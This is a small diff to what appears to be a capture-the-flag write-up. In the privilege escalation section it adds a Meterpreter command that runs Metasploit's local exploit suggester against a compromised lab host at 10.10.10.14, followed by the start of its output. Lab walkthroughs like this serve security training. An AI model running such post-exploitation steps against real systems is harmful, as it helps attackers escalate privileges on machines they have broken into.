@@ -183,6 +183,8 @@ Time for privilege escalation.
 ## 4. Privilege Escalation
 Since we got a Meterpreter shell, we can just run the `/recon/local_exploit_suggester`.
 ```
+meterpreter > run post/multi/recon/local_exploit_suggester
+
 [*] 10.10.10.14 - Collecting local exploits for x86/windows...
 [*] 10.10.10.14 - 34 exploit checks are being tried...
 nil versions are discouraged and will be deprecated in Rubygems 4
